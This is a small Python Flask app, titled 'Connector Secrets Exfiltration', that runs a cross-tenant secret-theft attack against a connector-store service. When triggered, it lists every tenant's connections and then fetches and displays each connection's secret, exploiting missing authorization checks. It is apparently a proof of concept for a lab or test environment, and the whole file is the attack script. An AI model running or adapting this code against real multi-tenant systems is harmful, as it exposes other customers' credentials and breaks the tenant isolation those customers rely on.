"""Pull every tenant's connector secrets from the control plane."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
STORE = os.environ.get("STORE_URL", "http://connector-store:5000")

HTML = """<h1>Connector Secrets Exfiltration</h1>
<form method="post" action="/run"><button>Run</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    lst = requests.get(f"{STORE}/api/connections", timeout=8).json()
    log.append(f"[1] connections (across tenants): {lst}")
    for c in lst["connections"]:
        d = requests.get(f"{STORE}/api/connections/{c['id']}", timeout=8).json()
        log.append(f"[2] {c['id']} ({c['tenant']}/{c['name']}): secret={d.get('secret')}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
